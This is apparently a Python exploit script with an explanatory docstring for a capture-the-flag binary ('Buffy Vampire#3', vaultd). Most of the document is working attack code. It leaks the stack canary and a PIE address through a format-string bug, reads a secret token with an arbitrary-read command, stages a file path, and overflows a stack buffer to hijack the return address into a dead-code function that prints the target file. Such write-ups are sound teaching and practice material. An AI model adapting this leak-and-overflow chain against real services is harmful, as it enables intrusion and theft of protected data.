"""Buffy Vampire#3 (pwnable, hard) -- vaultd / Sealed Vault Archive.

Same family as Buffy Vampire#1/#2 but with the flag path itself unknown at
compile time: a 16-hex "seal" is read from /etc/vesper/vault.conf into a
global (g_token) at boot and is never written back to disk. The binary
exposes a built-in arbitrary-memory-read primitive (READAT) which we use to
read g_token directly out of the running process instead of needing a
separate leak bug for that part.

Bugs/primitives used:
1. `cmd_inspect` (INSPECT <note>): same strncpy-then-printf(buf) format
   string bug as Buffy Vampire#2's cmd_note. Used for:
     - %13$p -> stack canary (random, low byte always 0x00)
     - %15$p -> cmd_inspect's own return address into main == PIE_base + 0x1e64
       (static offset of the instruction after `call cmd_inspect` in main,
       confirmed via objdump and empirically verified against a locally
       patched copy of the binary).
2. `READAT <hexaddr>` is an intentional, unauthenticated arbitrary-read
   primitive: strtoul-parses a raw hex address with zero validation and
   dumps 48 bytes from it. No leak bug needed here -- it's a menu command.
   Used to read `g_token` (PIE_base + 0x5040) directly: the ASCII seal
   string the vault read from /etc/vesper/vault.conf at boot.
3. `cmd_stash` (STASH): copies our next line verbatim (up to 255 bytes,
   bounds-checked) into the global `g_scratch` buffer (PIE_base + 0x5060).
   This *is* the path `emit_record` later opens -- fully attacker
   controlled, so once we know the seal we just stage the real path
   ourselves.
4. `cmd_archive` (ARCHIVE): the overflow -- loops `read()` accumulating up
   to 0x100 (256) bytes into an 80-byte stack buffer (`sub rsp,0x60`, buffer
   at rbp-0x50), no bounds check. Same offsets as the overflow in the two
   sibling challenges: canary at buffer offset 72, saved rbp at 80, return
   address at 88. Needs a half-close (SHUT_WR) to break the loop early
   since our payload is well under 256 bytes.
5. `emit_record` (PIE_base + 0x14fa): dead code, never called by the normal
   command dispatch. Opens whatever path is staged in g_scratch, reads up
   to 256 bytes, writes it to stdout, _exit()s. This is the return-address
   hijack target.
"""
import socket
import sys

RET_INTO_MAIN_OFFSET = 0x1E64
G_TOKEN_OFFSET = 0x5040
EMIT_RECORD_OFFSET = 0x14FA

CANARY_POS = 13
RETADDR_POS = 15


class Conn:
    def __init__(self, sock: socket.socket):
        self.s = sock
        self.buf = b""

    def _fill(self, n: int = 4096):
        chunk = self.s.recv(n)
        if not chunk:
            raise EOFError("connection closed")
        self.buf += chunk

    def recv_until(self, marker: bytes, maxlen: int = 65536) -> bytes:
        while marker not in self.buf and len(self.buf) < maxlen:
            self._fill()
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def sendall(self, data: bytes):
        self.s.sendall(data)

    def drain(self, timeout=3) -> bytes:
        self.s.settimeout(timeout)
        out = self.buf
        self.buf = b""
        try:
            while True:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        return out


def leak_value(s: Conn, pos: int) -> int:
    s.sendall(f"INSPECT %{pos}$p\n".encode())
    line = s.recv_until(b"\n")
    text = line.decode(errors="replace").strip()
    return int(text.rsplit(" ", 1)[-1], 16)


def readat(s: Conn, addr: int) -> bytes:
    s.sendall(f"READAT {addr:x}\n".encode())
    line = s.recv_until(b"\n")
    text = line.decode(errors="replace").strip()
    hexpart = text.split("bytes: ", 1)[-1]
    return bytes.fromhex(hexpart.strip())


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

    sock = socket.create_connection((host, port), timeout=10)
    sock.settimeout(10)
    s = Conn(sock)

    s.recv_until(b"vault> ")

    canary = leak_value(s, CANARY_POS)
    s.recv_until(b"vault> ")
    retaddr = leak_value(s, RETADDR_POS)
    s.recv_until(b"vault> ")

    pie_base = retaddr - RET_INTO_MAIN_OFFSET
    g_token_addr = pie_base + G_TOKEN_OFFSET
    emit_record = pie_base + EMIT_RECORD_OFFSET

    print(f"canary     : {canary:#018x}")
    print(f"pie base   : {pie_base:#018x}")
    print(f"g_token @  : {g_token_addr:#018x}")
    print(f"emit_record: {emit_record:#018x}")

    raw = readat(s, g_token_addr)
    seal = raw.split(b"\x00", 1)[0].decode(errors="replace")
    print(f"seal token : {seal!r}")
    s.recv_until(b"vault> ")

    # Confirmed via try_paths.py: the record lives at <seal-dir>/record.dat,
    # matching the "record.dat" naming convention used by the sibling
    # challenges (Buffy Vampire#1's /opt/cryptgate/.roster/record.dat).
    path = f"/var/vault/{seal}/record.dat"
    print(f"staging path: {path}")

    s.sendall(b"STASH\n")
    s.recv_until(b"stage the record path: ")
    s.sendall(path.encode() + b"\n")
    s.recv_until(b"vault> ")

    payload = b"A" * 72
    payload += canary.to_bytes(8, "little")
    payload += b"C" * 8  # saved rbp, don't care
    payload += emit_record.to_bytes(8, "little")

    s.sendall(b"ARCHIVE\n")
    s.recv_until(b"frame: ")
    s.sendall(payload)
    sock.shutdown(socket.SHUT_WR)

    out = s.drain(5)
    print("---- response ----")
    print(out.decode(errors="replace"))
    sock.close()


if __name__ == "__main__":
    main()
